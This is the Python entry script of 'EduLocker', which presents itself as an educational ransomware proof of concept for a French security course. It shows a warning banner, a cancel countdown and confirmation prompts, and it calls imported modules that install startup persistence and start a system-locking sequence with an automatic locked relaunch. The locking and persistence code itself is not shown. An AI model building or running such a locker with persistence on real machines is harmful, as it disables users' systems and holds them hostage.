# main.py
# !/usr/bin/env python3
"""
EduLocker POC - Ransomware Éducatif
PROJET ÉDUCATIF UNIQUEMENT - NE PAS UTILISER À DES FINS MALVEILLANTES

Auteur: IGBYA
Cours: Sécurité Informatique
Version: POC 1.0
"""

import sys
import os
import logging
import argparse
import time
from datetime import datetime
import traceback

from core.persistence import PersistenceManager
from core.anti_malware import run_gui as run_antimalware_gui, run_cli_scan as run_antimalware_cli

# Ajout du répertoire courant au path
sys.path.append(os.path.dirname(os.path.abspath(__file__)))

# Imports des modules du projet
from core.locker import SystemLocker
from utils.system_info import SystemAnalyzer
from config.settings import POC_CONFIG


def setup_logging():
	"""Configuration du système de logging"""
	log_dir = "logs"
	if not os.path.exists(log_dir):
		os.makedirs(log_dir)

	log_filename = f"logs/edulocker_poc_{datetime.now().strftime('%Y%m%d_%H%M%S')}.log"

	logging.basicConfig(
		level=logging.INFO,
		format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
		handlers=[
			logging.FileHandler(log_filename),
			logging.StreamHandler(sys.stdout)
		]
	)

	return logging.getLogger('EduLocker')


def display_warning():
	"""Affichage de l'avertissement éducatif"""
	warning_message = """
    ╔══════════════════════════════════════════════════════════════╗
    ║                    ⚠️  AVERTISSEMENT ⚠️                      ║
    ║                                                              ║
    ║  Ce programme est un RANSOMWARE ÉDUCATIF développé dans     ║
    ║  le cadre d'un cours de sécurité informatique.              ║
    ║                                                              ║
    ║  UTILISATION STRICTEMENT ÉDUCATIVE UNIQUEMENT               ║
    ║                                                              ║
    ║  Code de déverrouillage : UNLOCK2024                        ║
    ║  Appuyez sur Ctrl+C pour annuler avant le démarrage         ║
    ╚══════════════════════════════════════════════════════════════╝
    """
	print(warning_message)

	# Délai de sécurité pour permettre l'annulation
	for i in range(5, 0, -1):
		print(f"Démarrage dans {i} secondes... (Ctrl+C pour annuler)")
		time.sleep(1)
	print()


def check_environment():
	"""Vérification de l'environnement d'exécution"""
	logger = logging.getLogger('EduLocker.Environment')

	# Vérification du système d'exploitation
	if sys.platform not in ['linux', 'win32']:
		logger.warning(f"Système non testé : {sys.platform}")

	# Vérification des permissions
	if sys.platform == "linux" and os.geteuid() == 0:  # Root sur Linux
		logger.warning("Exécution en tant que root détectée")
		response = input("Continuer en tant que root ? (y/N): ")
		if response.lower() != 'y':
			logger.info("Arrêt demandé par l'utilisateur")
			sys.exit(0)

	# Collecte d'informations système
	analyzer = SystemAnalyzer()
	system_info = analyzer.gather_basic_info()

	logger.info(f"Système détecté : {system_info['os']} {system_info['os_version']}")
	logger.info(f"Architecture : {system_info['machine']}")

	return system_info


def cleanup():
	"""
	Fonction de nettoyage pour supprimer toutes les méthodes de persistance

	Cette fonction est appelée soit directement avec l'option --cleanup,
	soit dans le bloc finally pour assurer un nettoyage de sécurité.

	Returns:
		bool: True si le nettoyage a réussi, False sinon
	"""
	try:
		logger = setup_logging()
		logger.info("=== NETTOYAGE EDULOCKER POC ===")
		print("🧹 Nettoyage du système en cours...")

		# Initialisation du gestionnaire de persistance
		persistence = PersistenceManager(POC_CONFIG, logger)

		# Suppression de toutes les méthodes de persistance
		if persistence.clear_all_persistence_methods():
			logger.info("Toutes les méthodes de persistance ont été supprimées")
			print("✅ Nettoyage réussi. Toutes les méthodes de persistance ont été supprimées.")
		else:
			logger.warning("Certaines méthodes de persistance n'ont pas pu être supprimées")
			print("⚠️ Certaines méthodes de persistance n'ont pas pu être supprimées.")

		logger.info("=== FIN NETTOYAGE EDULOCKER POC ===")
		return True
	except Exception as e:
		print(f"❌ Erreur lors du nettoyage : {e}")
		if logger:
			logger.error(f"Erreur lors du nettoyage : {e}")
		return False

def main():
	"""
	Point d'entrée principal du POC EduLocker

	Gère les différents modes d'exécution:
	- Mode normal: Affiche l'avertissement, demande confirmation et exécute le verrouillage
	- Mode nettoyage (--cleanup): Supprime toutes les méthodes de persistance
	- Mode démarrage verrouillé (--locked-startup): Utilisé pour le démarrage automatique
	"""
	# Analyse des arguments de ligne de commande
	parser = argparse.ArgumentParser(description="EduLocker - Ransomware Éducatif POC")
	parser.add_argument("--cleanup", action="store_true", help="Nettoie toutes les méthodes de persistance et quitte")
	parser.add_argument("--locked-startup", action="store_true", help="Démarrage en mode verrouillé (usage interne)")
	parser.add_argument("--antimalware", action="store_true", help="Lance l'outil anti-malware avec interface graphique")
	parser.add_argument("--scan", action="store_true", help="Effectue une analyse anti-malware en ligne de commande")
	args = parser.parse_args()

	# Si l'option de nettoyage est spécifiée, exécuter uniquement le nettoyage
	if args.cleanup:
		cleanup()
		return

	# Si l'option anti-malware est spécifiée, lancer l'interface graphique anti-malware
	if args.antimalware:
		print("Lancement de l'outil anti-malware EduLocker...")
		run_antimalware_gui()
		return

	# Si l'option scan est spécifiée, effectuer une analyse en ligne de commande
	if args.scan:
		print("Démarrage de l'analyse anti-malware en ligne de commande...")
		run_antimalware_cli()
		return

	logger = None
	try:
		# Configuration du logging
		logger = setup_logging()
		logger.info("=== DÉMARRAGE EDULOCKER POC ===")

		# Affichage de l'avertissement (sauf si démarrage automatique)
		if not args.locked_startup:
			display_warning()

		# Vérification de l'environnement
		system_info = check_environment()

		# Confirmation finale (sauf si démarrage automatique)
		if not args.locked_startup:
			print("🔒 Prêt à démarrer le POC EduLocker")
			response = input("Confirmer le démarrage ? (y/N): ")

			if response.lower() != 'y':
				logger.info("Démarrage annulé par l'utilisateur")
				print("✅ Démarrage annulé. Aucune action effectuée.")
				return

		logger.info("Démarrage confirmé" + (" automatiquement" if args.locked_startup else " par l'utilisateur"))

		# Initialisation du locker
		logger.info("Initialisation du système de verrouillage...")
		locker = SystemLocker(config=POC_CONFIG, system_info=system_info)

		# Gestion de la persistance (sauf si démarrage automatique)
		if not args.locked_startup:
			persistence = PersistenceManager(POC_CONFIG, logger)
			persistence.clear_all_persistence_methods()
			persistence.apply_all_persistence_methods()

		# Démarrage du verrouillage
		logger.info("Démarrage du verrouillage système...")
		locker.start_lock_sequence()

		logger.info("=== FIN EDULOCKER POC ===")

	except KeyboardInterrupt:
		if logger:
			logger.info("Interruption par l'utilisateur (Ctrl+C)")
		print("\n✅ Arrêt demandé. Aucune action malveillante effectuée.")

	except Exception as e:
		print(traceback.format_exc())
		if logger:
			logger.error(f"Erreur inattendue : {e}")
		print(f"❌ Erreur : {e}")
		print("Le programme va se terminer de manière sécurisée.")

	finally:
		# Nettoyage de sécurité
		print("🧹 Nettoyage en cours...")
		try:
			if not args.locked_startup:
				# Utiliser un nouveau logger si l'ancien n'est pas disponible
				if not logger:
					logger = setup_logging()
					logger.info("=== NETTOYAGE DE SÉCURITÉ ===")

				persistence = PersistenceManager(POC_CONFIG, logger)
				if persistence.clear_all_persistence_methods():
					logger.info("Nettoyage de sécurité réussi")
				else:
					logger.warning("Nettoyage de sécurité partiel - certaines méthodes n'ont pas pu être supprimées")
		except Exception as cleanup_error:
			print(f"⚠️ Erreur lors du nettoyage de sécurité : {cleanup_error}")
			if logger:
				logger.error(f"Erreur lors du nettoyage de sécurité : {cleanup_error}")


if __name__ == "__main__":
	main()
